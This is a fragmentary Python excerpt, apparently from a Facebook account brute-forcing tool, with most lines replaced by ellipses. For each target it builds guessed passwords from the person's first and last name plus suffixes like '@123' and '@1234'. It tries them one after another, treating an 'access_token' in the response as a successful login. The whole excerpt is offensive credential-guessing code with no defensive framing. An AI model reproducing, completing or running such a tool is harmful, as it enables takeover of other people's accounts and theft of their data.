...
def pilih_super():
	...
	def main(arg):
		...
		try:
			...
			b = json.loads(a.text)
			pass1 = b['first_name']+b['last_name']+'@123'
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					pass2 = b['last_name']+b['first_name']+'@123'
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							pass3 = "@"+b['first_name']+b['last_name']+'123'
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									pass4 = "@"+b['last_name']+b['first_name']+'123'
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											pass5 = b['first_name']+b['last_name']+'@1234'
